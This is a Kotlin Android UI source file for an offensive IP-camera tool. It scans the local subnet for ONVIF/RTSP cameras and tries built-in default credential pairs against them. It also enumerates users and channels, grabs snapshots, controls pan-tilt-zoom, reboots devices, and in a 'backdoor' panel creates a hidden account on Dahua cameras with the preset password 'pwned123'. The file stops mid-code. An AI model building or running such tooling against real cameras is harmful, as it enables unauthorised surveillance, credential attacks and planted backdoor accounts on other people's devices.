package xin.ctkqiang.deauthctrl.ui.screens

import androidx.compose.animation.AnimatedContent
import androidx.compose.animation.core.FastOutSlowInEasing
import androidx.compose.animation.core.tween
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.slideInHorizontally
import androidx.compose.animation.slideOutHorizontally
import androidx.compose.animation.togetherWith
import androidx.compose.foundation.Image
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CutCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import xin.ctkqiang.deauthctrl.R
import xin.ctkqiang.deauthctrl.manager.OnvifCamManager
import xin.ctkqiang.deauthctrl.ui.components.ActionButton
import xin.ctkqiang.deauthctrl.ui.components.BorderDim
import xin.ctkqiang.deauthctrl.ui.components.Danger
import xin.ctkqiang.deauthctrl.ui.components.Dark
import xin.ctkqiang.deauthctrl.ui.components.EmptyHint
import xin.ctkqiang.deauthctrl.ui.components.Gold
import xin.ctkqiang.deauthctrl.ui.components.Gray
import xin.ctkqiang.deauthctrl.ui.components.Mono
import xin.ctkqiang.deauthctrl.ui.components.Red
import xin.ctkqiang.deauthctrl.ui.components.Sans
import xin.ctkqiang.deauthctrl.ui.components.SelectChip
import xin.ctkqiang.deauthctrl.ui.components.Star
import xin.ctkqiang.deauthctrl.ui.components.SurfaceAlt
import xin.ctkqiang.deauthctrl.ui.components.SurfaceBg
import xin.ctkqiang.deauthctrl.ui.components.TacGreen
import xin.ctkqiang.deauthctrl.ui.components.TacticalStatStrip
import xin.ctkqiang.deauthctrl.ui.components.TermInput
import xin.ctkqiang.deauthctrl.ui.components.TermPanel
import xin.ctkqiang.deauthctrl.ui.components.TerminalHeader
import xin.ctkqiang.deauthctrl.ui.components.Warn
import xin.ctkqiang.deauthctrl.ui.components.White
import xin.ctkqiang.deauthctrl.ui.components.hud
import xin.ctkqiang.deauthctrl.viewmodel.IntelFeedViewModel

/**
 * 监控眼 —— ONVIF/RTSP 摄像头安全套件(逻辑移植自 pwneye,本应用结构)
 *
 * 四工作区:发现(WS-Discovery 组播)/ 目标(设备信息+凭据+流地址)/
 * 控制(PTZ+重启+打开直播)/ 影像(压暗/恢复)。
 * 全部操作走摄像头自身 SOAP 接口;重启/压暗真实改变设备 —— 仅限授权目标。
 */
@Composable
fun CameraOpsScreen(preselectIp: String? = null, back: () -> Unit, autoScan: Boolean = false) {
    val context = LocalContext.current
    val manager = remember { OnvifCamManager(context) }
    val cameras by manager.cameras.collectAsState()
    val scanning by manager.scanning.collectAsState()
    val log by manager.log.collectAsState()
    val haptic = LocalHapticFeedback.current

    // 深链自扫:进入页面即执行一键扫描(阶段 1 组播 + 阶段 2 HTTP 网段探测,结果合并)
    LaunchedEffect(autoScan) {
        if (autoScan) {
            kotlinx.coroutines.delay(1500)
            manager.scanAll()
        }
    }
    var tab by remember { mutableStateOf(0) }
    var selectedId by remember { mutableStateOf<String?>(null) }
    var user by remember { mutableStateOf("admin") }
    var pass by remember { mutableStateOf("") }
    var opMsg by remember { mutableStateOf<String?>(null) }
    var opErr by remember { mutableStateOf(false) }
    var rtspUrl by remember { mutableStateOf<String?>(null) }
    val selected = selectedId?.let { id -> cameras.firstOrNull { it.id == id } }

    LaunchedEffect(Unit) {
        if (preselectIp != null) selectedId = null
        if (!autoScan) manager.discover() // autoScan 模式由上面的 scanAll 负责,避免重复组播
        // 期间循环刷新设备信息(免认证字段)
        while (true) {
            delay(4000)
            cameras.forEach { runCatching { manager.fetchInfo(it) } }
            // 雷达跳转预选:发现列表一到就选中该 IP
            if (preselectIp != null && selectedId == null) {
                cameras.firstOrNull { it.ip == preselectIp }?.let { selectedId = it.id }
            }
        }
    }

    Column(Modifier.fillMaxSize().background(Dark)) {
        TerminalHeader(stringResource(R.string.onvif_title), back)
        Column(Modifier.fillMaxSize().navigationBarsPadding().padding(horizontal = 10.dp, vertical = 6.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                SelectChip(tab == 0, stringResource(R.string.onvif_tab_discover)) { tab = 0 }
                SelectChip(tab == 1, stringResource(R.string.onvif_tab_target)) { tab = 1 }
                SelectChip(tab == 2, stringResource(R.string.onvif_tab_control)) { tab = 2 }
                SelectChip(tab == 3, stringResource(R.string.onvif_tab_imaging)) { tab = 3 }
                SelectChip(tab == 4, stringResource(R.string.onvif_tab_console)) { tab = 4 }
            }
            Spacer(Modifier.height(8.dp))
            AnimatedContent(
                targetState = tab,
                transitionSpec = {
                    (slideInHorizontally(tween(240, easing = FastOutSlowInEasing)) { it / 4 } + fadeIn(tween(180)))
                        .togetherWith(slideOutHorizontally(tween(200)) { -it / 6 } + fadeOut(tween(140)))
                },
            ) { t ->
                when (t) {
                    0 -> DiscoverTab(manager, cameras, scanning, log, onSelect = { selectedId = it })
                    1 -> TargetTab(manager, selected, user, pass, onUser = { user = it }, onPass = { pass = it }, rtspUrl = rtspUrl, onRtsp = { rtspUrl = it }, opMsg = opMsg, opErr = opErr, onOp = { msg, err -> opMsg = msg; opErr = err })
                    2 -> ControlTab(manager, selected, user, pass, rtspUrl, onOp = { msg, err -> opMsg = msg; opErr = err })
                    3 -> ImagingTab(manager, selected, user, pass, onOp = { msg, err -> opMsg = msg; opErr = err })
                    else -> ConsoleTab(manager, selected, user, pass)
                }
            }
        }
    }
}

// ─── 发现 ────────────────────────────────────────────────────────────────────

@Composable
private fun DiscoverTab(
    manager: OnvifCamManager,
    cameras: List<OnvifCamManager.OnvifCamera>,
    scanning: Boolean,
    log: List<String>,
    onSelect: (String) -> Unit,
) {
    val haptic = LocalHapticFeedback.current
    val context = LocalContext.current
    var mode by remember { mutableStateOf(0) } // 0 组播 / 1 RTSP 扫描 / 2 手动
    var manualIp by remember { mutableStateOf("") }
    var manualPort by remember { mutableStateOf("") }
    val progress by manager.rtspProgress.collectAsState()
    val phase by manager.phase.collectAsState()
    var probeMsg by remember { mutableStateOf<String?>(null) }

    Column(Modifier.fillMaxSize()) {
        TacticalStatStrip(
            listOf(
                "${cameras.size}" to stringResource(R.string.onvif_stat_cams),
                (if (scanning) stringResource(R.string.tact_strip_on) else stringResource(R.string.tact_strip_off)) to stringResource(R.string.onvif_stat_probe),
                "${progress.first}/${progress.second}" to stringResource(R.string.onvif_stat_swept),
                (if (mode == 0) stringResource(R.string.onvif_mode_mcast) else if (mode == 1) stringResource(R.string.onvif_mode_rtsp) else stringResource(R.string.onvif_mode_manual)) to stringResource(R.string.onvif_stat_mode),
            ),
        )
        Spacer(Modifier.height(6.dp))
        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(5.dp)) {
            SelectChip(mode == 0, stringResource(R.string.onvif_mode_mcast)) { mode = 0 }
            SelectChip(mode == 1, stringResource(R.string.onvif_mode_rtsp)) { mode = 1 }
            SelectChip(mode == 2, stringResource(R.string.onvif_mode_manual)) { mode = 2 }
        }
        Spacer(Modifier.height(6.dp))

        when (mode) {
            0 -> Column {
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                    ActionButton(
                        running = scanning,
                        runLabel = stringResource(R.string.onvif_btn_scan_all),
                        stopLabel = stringResource(R.string.onvif_btn_scanning),
                        modifier = Modifier.weight(1f),
                    ) {
                        haptic.hud()
                        if (scanning) {
                            manager.stopRtspScan()
                        } else {
                            kotlinx.coroutines.GlobalScope.launchSafe {
                                manager.scanAll() // 组播 + HTTP 逐台探测,两阶段结果合并
                            }
                        }
                    }
                }
                if (scanning) {
                    Spacer(Modifier.height(5.dp))
                    Text(phase, fontFamily = Mono, fontSize = 8.sp, fontWeight = FontWeight.Bold, color = Gold)
                    Spacer(Modifier.height(3.dp))
                    LinearProgressIndicator(
                        progress = { (progress.first.toFloat() / progress.second.coerceAtLeast(1)).coerceIn(0f, 1f) },
                        modifier = Modifier.fillMaxWidth().height(4.dp),
                    )
                    Text(stringResource(R.string.onvif_sweep_progress, progress.first, progress.second), fontFamily = Mono, fontSize = 8.sp, color = Gold, modifier = Modifier.padding(top = 3.dp))
                }
                Spacer(Modifier.height(4.dp))
                Text(stringResource(R.string.onvif_scan_hint), fontFamily = Sans, fontSize = 8.sp, color = Gray, lineHeight = 12.sp)
            }
            1 -> Column {
                // RTSP 扫描:自动取本机 /24 网段
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                    ActionButton(
                        running = scanning,
                        runLabel = stringResource(R.string.onvif_btn_rtsp_scan),
                        stopLabel = stringResource(R.string.onvif_btn_rtsp_stop),
                        modifier = Modifier.weight(1f),
                    ) {
                        haptic.hud()
                        if (scanning) {
                            manager.stopRtspScan()
                        } else {
                            kotlinx.coroutines.GlobalScope.launchSafe {
                                val prefix = localIpPrefix(context) ?: run {
                                    probeMsg = context.getString(R.string.onvif_no_lan)
                                    return@launchSafe
                                }
                                probeMsg = null
                                manager.rtspScan(prefix)
                            }
                        }
                    }
                }
                if (scanning) {
                    Spacer(Modifier.height(6.dp))
                    LinearProgressIndicator(
                        progress = { (progress.first.toFloat() / progress.second.coerceAtLeast(1)).coerceIn(0f, 1f) },
                        modifier = Modifier.fillMaxWidth().height(4.dp),
                    )
                    Text(stringResource(R.string.onvif_sweep_progress, progress.first, progress.second), fontFamily = Mono, fontSize = 8.sp, color = Gold, modifier = Modifier.padding(top = 3.dp))
                }
                Spacer(Modifier.height(4.dp))
                Text(stringResource(R.string.onvif_rtsp_scan_hint), fontFamily = Sans, fontSize = 8.sp, color = Gray, lineHeight = 12.sp)
            }
            else -> Column {
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp), verticalAlignment = Alignment.CenterVertically) {
                    TermInput(stringResource(R.string.onvif_label_ip), manualIp, placeholder = "192.168.1.64", modifier = Modifier.weight(1.4f)) { manualIp = it }
                    TermInput(stringResource(R.string.onvif_label_port), manualPort, placeholder = "80/554", modifier = Modifier.weight(1f)) { manualPort = it }
                }
                Spacer(Modifier.height(6.dp))
                ActionButton(
                    running = scanning,
                    runLabel = stringResource(R.string.onvif_btn_probe),
                    stopLabel = stringResource(R.string.onvif_btn_scanning),
                    modifier = Modifier.fillMaxWidth(),
                ) {
                    haptic.hud()
                    kotlinx.coroutines.GlobalScope.launchSafe {
                        val ip = manualIp.trim()
                        if (ip.isEmpty()) {
                            probeMsg = context.getString(R.string.onvif_need_ip)
                            return@launchSafe
                        }
                        probeMsg = context.getString(R.string.onvif_probing)
                        val cam = manager.probeManual(ip, manualPort.trim().toIntOrNull() ?: 0)
                        probeMsg = if (cam != null) {
                            onSelect(cam.id)
                            context.getString(R.string.onvif_probe_ok, cam.ip, cam.port)
                        } else context.getString(R.string.onvif_probe_fail)
                    }
                }
                probeMsg?.let {
                    Spacer(Modifier.height(4.dp))
                    Text(it, fontFamily = Mono, fontSize = 8.5.sp, color = TacGreen)
                }
                Spacer(Modifier.height(4.dp))
                Text(stringResource(R.string.onvif_manual_hint), fontFamily = Sans, fontSize = 8.sp, color = Gray, lineHeight = 12.sp)
            }
        }

        Spacer(Modifier.height(6.dp))
        if (cameras.isEmpty()) {
            if (scanning) {
                EmptyHint(stringResource(R.string.onvif_scanning_hint))
            } else {
                Surface(
                    Modifier.fillMaxWidth(),
                    shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                    color = Warn.copy(alpha = 0.08f),
                    border = BorderStroke(1.dp, Warn.copy(alpha = 0.5f)),
                ) {
                    Column(Modifier.padding(10.dp)) {
                        Text(stringResource(R.string.onvif_empty_title), fontFamily = Mono, fontSize = 9.sp, fontWeight = FontWeight.Bold, color = Warn)
                        Spacer(Modifier.height(4.dp))
                        Text(stringResource(R.string.onvif_empty_reasons), fontFamily = Sans, fontSize = 9.sp, color = White, lineHeight = 14.sp)
                    }
                }
            }
        } else {
            LazyColumn(Modifier.fillMaxSize()) {
                items(cameras, key = { it.id }) { cam ->
                    Surface(
                        Modifier.fillMaxWidth().padding(vertical = 3.dp).clickable {
                            haptic.hud()
                            onSelect(cam.id)
                        },
                        shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                        color = SurfaceBg,
                        border = BorderStroke(1.dp, BorderDim),
                    ) {
                        Column(Modifier.padding(horizontal = 10.dp, vertical = 7.dp)) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Star(Gold, 6.dp)
                                Spacer(Modifier.width(7.dp))
                                Text(cam.ip, fontFamily = Mono, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = White)
                                Spacer(Modifier.width(8.dp))
                                Text(":${cam.port}", fontFamily = Mono, fontSize = 9.sp, color = Gray)
                                Spacer(Modifier.width(6.dp))
                                val srcColor = when (cam.source) { "rtsp" -> Color(0xFF00E5FF); "manual" -> Warn; else -> TacGreen }
                                Text(stringResource(when (cam.source) { "rtsp" -> R.string.onvif_src_rtsp; "manual" -> R.string.onvif_src_manual; "http" -> R.string.onvif_src_http; else -> R.string.onvif_src_onvif }), fontFamily = Mono, fontSize = 7.sp, fontWeight = FontWeight.Bold, color = srcColor)
                                Spacer(Modifier.width(6.dp))
                                Text(if (cam.infoFetched || cam.manufacturer.isNotEmpty()) "${cam.manufacturer} ${cam.model}".trim().take(18) else stringResource(R.string.onvif_fetching), fontFamily = Sans, fontSize = 9.sp, color = if (cam.infoFetched || cam.manufacturer.isNotEmpty()) TacGreen else Gray, maxLines = 1)
                            }
                            Spacer(Modifier.height(2.dp))
                            Text(cam.xaddr.ifBlank { stringResource(R.string.onvif_no_onvif) }, fontFamily = Mono, fontSize = 7.5.sp, color = Gray, maxLines = 1)
                            Text(stringResource(R.string.onvif_found_at, java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(cam.foundAtMs))), fontFamily = Mono, fontSize = 7.sp, color = Gray.copy(alpha = 0.7f))
                        }
                    }
                }
            }
        }
        Spacer(Modifier.height(6.dp))
        log.takeLast(3).forEach { line ->
            Text("▸ $line", fontFamily = Mono, fontSize = 7.5.sp, color = Gray, maxLines = 1)
        }
    }
}

/** 本机 /24 网段前缀(无则 null)—— 统一走 manager 助手,覆盖 10.x / 172.16-31.x / 192.168.x */
private fun localIpPrefix(context: android.content.Context): String? = OnvifCamManager.localLanPrefix(context)

// ─── 目标 ────────────────────────────────────────────────────────────────────

@Composable
private fun TargetTab(
    manager: OnvifCamManager,
    cam: OnvifCamManager.OnvifCamera?,
    user: String,
    pass: String,
    onUser: (String) -> Unit,
    onPass: (String) -> Unit,
    rtspUrl: String?,
    onRtsp: (String?) -> Unit,
    opMsg: String?,
    opErr: Boolean,
    onOp: (String?, Boolean) -> Unit,
) {
    val haptic = LocalHapticFeedback.current
    val context = LocalContext.current
    // 点击回调不是组合上下文,文案全部预取
    val okCredsText = stringResource(R.string.onvif_ok_creds)
    val failCredsText = stringResource(R.string.onvif_fail_creds)
    val okRtspText = stringResource(R.string.onvif_ok_rtsp)
    val failRtspText = stringResource(R.string.onvif_fail_rtsp)
    Column(Modifier.fillMaxSize().verticalScroll(rememberScrollState())) {
        if (cam == null) {
            EmptyHint(stringResource(R.string.onvif_pick_first))
            return@Column
        }
        TermPanel(stringResource(R.string.onvif_panel_device)) {
            InfoRow2("IP", "${cam.ip}:${cam.port}")
            InfoRow2(stringResource(R.string.onvif_info_mfr), cam.manufacturer.ifBlank { "--" })
            InfoRow2(stringResource(R.string.onvif_info_model), cam.model.ifBlank { "--" })
            InfoRow2(stringResource(R.string.onvif_info_fw), cam.firmware.ifBlank { "--" })
            InfoRow2(stringResource(R.string.onvif_info_serial), cam.serial.ifBlank { "--" })
        }
        Spacer(Modifier.height(8.dp))
        TermPanel(stringResource(R.string.onvif_panel_creds)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                TermInput(stringResource(R.string.onvif_label_user), user, modifier = Modifier.weight(1f)) { onUser(it) }
                TermInput(stringResource(R.string.onvif_label_pass), pass, modifier = Modifier.weight(1f)) { onPass(it) }
            }
            Spacer(Modifier.height(6.dp))
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                ActionButton(
                    running = false,
                    runLabel = stringResource(R.string.onvif_btn_test),
                    stopLabel = stringResource(R.string.onvif_btn_test),
                    modifier = Modifier.weight(1f),
                ) {
                    haptic.hud()
                    kotlinx.coroutines.GlobalScope.launchSafe {
                        val ok = if (cam.source == "onvif" && cam.xaddr.isNotEmpty())
                            manager.testCredentials(cam, user, pass)
                        else manager.rtspTestCredsAndPath(cam.ip, cam.port, user, pass) != null
                        if (ok && (cam.source != "onvif" || cam.xaddr.isEmpty())) {
                            // RTSP 凭据通过同时把流地址填上
                            onRtsp(manager.rtspTestCredsAndPath(cam.ip, cam.port, user, pass))
                        }
                        onOp(if (ok) okCredsText else failCredsText, !ok)
                    }
                }
                ActionButton(
                    running = false,
                    runLabel = stringResource(R.string.onvif_btn_rtsp),
                    stopLabel = stringResource(R.string.onvif_btn_rtsp),
                    modifier = Modifier.weight(1f),
                ) {
                    haptic.hud()
                    kotlinx.coroutines.GlobalScope.launchSafe {
                        val url = if (cam.source == "onvif" && cam.xaddr.isNotEmpty())
                            manager.getRtspUrl(cam, user, pass)
                        else manager.rtspTestCredsAndPath(cam.ip, cam.port, user, pass)
                        onRtsp(url)
                        onOp(if (url != null) okRtspText else failRtspText, url == null)
                    }
                }
            }
            Spacer(Modifier.height(6.dp))
            // 快速凭据表(内置常见默认口令,点击即测)
            Text(stringResource(R.string.onvif_quick_creds), fontFamily = Mono, fontSize = 7.5.sp, fontWeight = FontWeight.Bold, color = Gold)
            Spacer(Modifier.height(4.dp))
            OnvifCamManager.COMMON_CREDENTIALS.take(12).chunked(4).forEach { rowCreds ->
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(5.dp)) {
                    rowCreds.forEach { (u, p) ->
                        Surface(
                            modifier = Modifier.weight(1f).clickable {
                                haptic.hud()
                                onUser(u); onPass(p)
                                kotlinx.coroutines.GlobalScope.launchSafe {
                                    val ok = manager.testCredentials(cam, u, p)
                                    onOp(if (ok) context.getString(R.string.onvif_ok_creds_pair, u, p.ifEmpty { "(空)" }) else failCredsText, !ok)
                                }
                            },
                            shape = CutCornerShape(topStart = 5.dp, bottomEnd = 5.dp),
                            color = SurfaceAlt,
                            border = BorderStroke(1.dp, BorderDim),
                        ) {
                            Text("${u}:${p.ifEmpty { "∅" }}", fontFamily = Mono, fontSize = 7.5.sp, color = Gray, textAlign = TextAlign.Center, maxLines = 1, modifier = Modifier.padding(horizontal = 3.dp, vertical = 5.dp))
                        }
                    }
                }
                Spacer(Modifier.height(5.dp))
            }
        }
        // ── 枚举:用户/网络/媒体档 ──
        Spacer(Modifier.height(8.dp))
        TermPanel(stringResource(R.string.onvif_panel_enum)) {
            var users by remember { mutableStateOf<List<String>?>(null) }
            var nets by remember { mutableStateOf<List<String>?>(null) }
            var profiles by remember { mutableStateOf<List<Pair<String, String>>?>(null) }
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                listOf(
                    stringResource(R.string.onvif_enum_users) to { kotlinx.coroutines.GlobalScope.launchSafe { users = manager.enumerateUsers(cam, user, pass) } },
                    stringResource(R.string.onvif_enum_network) to { kotlinx.coroutines.GlobalScope.launchSafe { nets = manager.enumerateNetwork(cam, user, pass) } },
                    stringResource(R.string.onvif_enum_profiles) to { kotlinx.coroutines.GlobalScope.launchSafe { profiles = manager.enumerateProfiles(cam, user, pass) } },
                ).forEach { (label, action) ->
                    Surface(
                        modifier = Modifier.weight(1f).clickable { haptic.hud(); action() },
                        shape = CutCornerShape(topStart = 6.dp, bottomEnd = 6.dp),
                        color = Gold.copy(alpha = 0.10f),
                        border = BorderStroke(1.dp, Gold.copy(alpha = 0.5f)),
                    ) {
                        Text(label, fontFamily = Mono, fontSize = 8.sp, fontWeight = FontWeight.Bold, color = Gold, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 7.dp))
                    }
                }
            }
            users?.let { list ->
                Spacer(Modifier.height(5.dp))
                Text(stringResource(R.string.onvif_enum_users) + ": " + list.joinToString(", "), fontFamily = Mono, fontSize = 8.sp, color = White)
            }
            nets?.let { list ->
                Spacer(Modifier.height(3.dp))
                list.take(6).forEach { n -> Text("▸ $n", fontFamily = Mono, fontSize = 8.sp, color = White) }
            }
            profiles?.let { list ->
                Spacer(Modifier.height(3.dp))
                list.take(6).forEach { (token, name) -> Text("▸ $name ($token)", fontFamily = Mono, fontSize = 8.sp, color = White) }
            }
        }

        // ── 快照 ──
        Spacer(Modifier.height(8.dp))
        TermPanel(stringResource(R.string.onvif_panel_snapshot)) {
            var snapBytes by remember { mutableStateOf<ByteArray?>(null) }
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                ActionButton(
                    running = false,
                    runLabel = stringResource(R.string.onvif_btn_snapshot),
                    stopLabel = stringResource(R.string.onvif_btn_snapshot),
                    modifier = Modifier.weight(1f),
                ) {
                    haptic.hud()
                    kotlinx.coroutines.GlobalScope.launchSafe {
                        snapBytes = manager.downloadSnapshot(cam, user, pass)
                        onOp(if (snapBytes != null) context.getString(R.string.onvif_ok_snap) else context.getString(R.string.onvif_fail_snap), snapBytes == null)
                    }
                }
            }
            snapBytes?.let { bytes ->
                Spacer(Modifier.height(5.dp))
                val bmp = remember(bytes) { android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size) }
                bmp?.let {
                    androidx.compose.foundation.Image(
                        bitmap = it.asImageBitmap(),
                        contentDescription = "snapshot",
                        modifier = Modifier.fillMaxWidth().heightIn(max = 220.dp)
                            .clip(CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp))
                            .border(1.dp, BorderDim, CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp)),
                    )
                }
            }
        }

        // ── 频道枚举(DVR/NVR) ──
        Spacer(Modifier.height(8.dp))
        TermPanel(stringResource(R.string.onvif_panel_channels)) {
            var channels by remember { mutableStateOf<List<String>?>(null) }
            ActionButton(
                running = false,
                runLabel = stringResource(R.string.onvif_btn_channels),
                stopLabel = stringResource(R.string.onvif_btn_channels),
            ) {
                haptic.hud()
                kotlinx.coroutines.GlobalScope.launchSafe {
                    channels = manager.enumerateChannels(cam.ip, cam.port, user, pass)
                    onOp(context.getString(R.string.onvif_ok_channels, channels?.size ?: 0), channels.isNullOrEmpty())
                }
            }
            channels?.let { list ->
                Spacer(Modifier.height(5.dp))
                list.take(8).forEachIndexed { i, url ->
                    Surface(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 2.dp).clickable {
                            haptic.hud()
                            onRtsp(url)
                        },
                        shape = CutCornerShape(topStart = 6.dp, bottomEnd = 6.dp),
                        color = SurfaceAlt,
                        border = BorderStroke(1.dp, BorderDim),
                    ) {
                        Text("CH${i + 1} ▸ ${url.take(60)}", fontFamily = Mono, fontSize = 8.sp, color = TacGreen, maxLines = 1, modifier = Modifier.padding(horizontal = 8.dp, vertical = 6.dp))
                    }
                }
            }
        }

        opMsg?.let {
            Spacer(Modifier.height(6.dp))
            Text(it, fontFamily = Mono, fontSize = 8.5.sp, color = if (opErr) Danger else TacGreen, lineHeight = 12.sp)
        }
        rtspUrl?.let {
            Spacer(Modifier.height(6.dp))
            TermPanel(stringResource(R.string.onvif_panel_rtsp)) {
                Text(it, fontFamily = Mono, fontSize = 8.sp, color = White, lineHeight = 12.sp)
            }
        }
    }
}

// ─── 控制 ────────────────────────────────────────────────────────────────────

@Composable
private fun ControlTab(
    manager: OnvifCamManager,
    cam: OnvifCamManager.OnvifCamera?,
    user: String,
    pass: String,
    rtspUrl: String?,
    onOp: (String?, Boolean) -> Unit,
) {
    val haptic = LocalHapticFeedback.current
    val context = LocalContext.current
    Column(Modifier.fillMaxSize()) {
        if (cam == null) {
            EmptyHint(stringResource(R.string.onvif_pick_first))
            return@Column
        }
        // PTZ 十字盘:八个方向按钮
        TermPanel(stringResource(R.string.onvif_panel_ptz)) {
            val speed = 0.5f
            fun move(pan: Float, tilt: Float) {
                haptic.hud()
                kotlinx.coroutines.GlobalScope.launchSafe {
                    val err = manager.ptzMove(cam, user, pass, pan, tilt, 0f)
                    onOp(err, err != null)
                }
            }
            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
                PtzButton("▲", Modifier.width(64.dp)) { move(0f, speed) }
                Row(verticalAlignment = Alignment.CenterVertically) {
                    PtzButton("◀", Modifier.width(64.dp)) { move(-speed, 0f) }
                    Box(Modifier.width(64.dp).height(44.dp).clip(CutCornerShape(topStart = 6.dp, bottomEnd = 6.dp)).background(SurfaceAlt).border(1.dp, BorderDim, CutCornerShape(topStart = 6.dp, bottomEnd = 6.dp)), contentAlignment = Alignment.Center) {
                        Text("◆", fontFamily = Mono, fontSize = 12.sp, color = Gold)
                    }
                    PtzButton("▶", Modifier.width(64.dp)) { move(speed, 0f) }
                }
                PtzButton("▼", Modifier.width(64.dp)) { move(0f, -speed) }
                Spacer(Modifier.height(6.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                    PtzButton("-", Modifier.width(64.dp)) { kotlinx.coroutines.GlobalScope.launchSafe { manager.ptzMove(cam, user, pass, 0f, 0f, -0.5f) } }
                    PtzButton("+", Modifier.width(64.dp)) { kotlinx.coroutines.GlobalScope.launchSafe { manager.ptzMove(cam, user, pass, 0f, 0f, 0.5f) } }
                }
            }
        }
        Spacer(Modifier.height(8.dp))
        TermPanel(stringResource(R.string.onvif_panel_actions)) {
            Surface(
                modifier = Modifier.fillMaxWidth().clickable {
                    haptic.hud()
                    rtspUrl?.let { url ->
                        runCatching {
                            context.startActivity(android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url)))
                        }
                    } ?: onOp(context.getString(R.string.onvif_need_rtsp_first), true)
                },
                shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                color = TacGreen.copy(alpha = 0.10f),
                border = BorderStroke(1.dp, TacGreen.copy(alpha = 0.55f)),
            ) {
                Text(stringResource(R.string.onvif_btn_view), fontFamily = Sans, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = TacGreen, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 10.dp))
            }
            Spacer(Modifier.height(6.dp))
            Surface(
                modifier = Modifier.fillMaxWidth().clickable {
                    haptic.hud()
                    kotlinx.coroutines.GlobalScope.launchSafe {
                        val err = manager.reboot(cam, user, pass)
                        onOp(err ?: context.getString(R.string.onvif_ok_reboot), err != null)
                    }
                },
                shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                color = Danger.copy(alpha = 0.12f),
                border = BorderStroke(1.dp, Danger.copy(alpha = 0.6f)),
            ) {
                Text(stringResource(R.string.onvif_btn_reboot), fontFamily = Sans, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Danger, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 10.dp))
            }
            Spacer(Modifier.height(8.dp))
            // ── 后门与未认证配置(hackers-arise IP 摄像头入侵专栏路线) ──
            TermPanel(stringResource(R.string.onvif_panel_backdoor)) {
                var newUser by remember { mutableStateOf("service") }
                var newPass by remember { mutableStateOf("pwned123") }
                var backdoorMsg by remember { mutableStateOf<String?>(null) }
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                    TermInput(stringResource(R.string.onvif_bd_user), newUser, modifier = Modifier.weight(1f)) { newUser = it }
                    TermInput(stringResource(R.string.onvif_bd_pass), newPass, modifier = Modifier.weight(1f)) { newPass = it }
                }
                Spacer(Modifier.height(6.dp))
                Surface(
                    modifier = Modifier.fillMaxWidth().clickable {
                        haptic.hud()
                        kotlinx.coroutines.GlobalScope.launchSafe {
                            val err = manager.dahuaCreateUser(cam, newUser, newPass)
                            backdoorMsg = err ?: context.getString(R.string.onvif_bd_ok, newUser)
                        }
                    },
                    shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                    color = Danger.copy(alpha = 0.14f),
